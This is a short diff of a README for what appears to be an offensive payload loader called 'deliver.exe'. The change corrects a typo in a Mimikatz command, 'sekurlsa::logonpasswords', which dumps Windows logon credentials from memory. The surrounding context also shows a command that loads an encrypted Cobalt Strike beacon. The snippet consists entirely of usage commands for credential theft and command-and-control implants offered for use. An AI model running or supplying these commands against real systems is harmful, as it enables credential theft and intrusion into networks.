@@ -40,7 +40,7 @@ the executable version has more options you can use, as you able to pass command
 
 ```
 ##Mimikatz dump LSA 
-deliver.exe -d -c sekurlasa::logonpasswords -f mimikatz.enc 
+deliver.exe -d -c sekurlsa::logonpasswords -f mimikatz.enc 
 
 ## Cobalt strike beacon 
 deliver.exe -d -f cobalt.enc 
